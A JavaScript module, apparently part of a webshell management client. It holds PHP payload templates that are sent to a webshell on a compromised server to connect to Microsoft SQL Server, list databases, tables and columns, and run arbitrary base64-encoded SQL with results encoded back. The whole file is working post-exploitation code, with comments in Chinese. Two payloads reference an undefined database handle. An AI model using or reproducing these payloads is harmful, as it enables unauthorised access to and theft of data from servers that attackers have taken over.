/**
 * 数据库管理模板::mssql
 * i 数据分隔符号 => \t|\t
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _:
      `$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$T=@mssql_connect($hst,$usr,$pwd);$q=@mssql_query("select [name] from master.dbo.sysdatabases order by 1",$T);while($rs=@mssql_fetch_row($q)){echo(trim($rs[0]).chr(9));}@mssql_free_result($q);@mssql_close($T);`,
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}'
  },
  // 显示数据库所有表
  show_tables: {
    _:
      `$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];$T=@mssql_connect($hst,$usr,$pwd);@mssql_select_db($dbn,$T);$q=@mssql_query("SELECT [name] FROM sysobjects WHERE (xtype='U' OR xtype='S') ORDER BY 1",$T);while($rs=@mssql_fetch_row($q)){echo(trim($rs[0]).chr(9));}@mssql_free_result($q);@mssql_close($T);`,
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}'
  },
  // 显示表字段
  show_columns: {
    _:
      `$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];$tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];$T=@mssql_connect($hst,$usr,$pwd);@mssql_select_db($dbn,$db);$q=@mssql_query("SELECT TOP 1 * FROM {$tab}",$T);while($rs=@mssql_fetch_field($q)){echo(trim($rs->name)." (".$rs->type.")".chr(9));}@mssql_free_result($q);@mssql_close($T);`,
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}',
    [arg5]: '#{table}'
  },
  // 执行SQL语句
  query: {
    _:
      `$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];$sql=base64_decode($_POST["${arg5}"]);$T=@mssql_connect($hst,$usr,$pwd);@mssql_select_db($dbn,$db);$q=@mssql_query($sql,$T);$i=0;while($rs=@mssql_fetch_field($q)){echo($rs->name."\t|\t");$i++;}echo("\r\n");while($rs=@mssql_fetch_row($q)){for($c=0;$c<$i;$c++){echo(base64_encode(trim($rs[$c])));echo("\t|\t");}echo("\r\n");}@mssql_free_result($q);@mssql_close($T);`,
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}',
    [arg5]: '#{base64::sql}'
  }
})
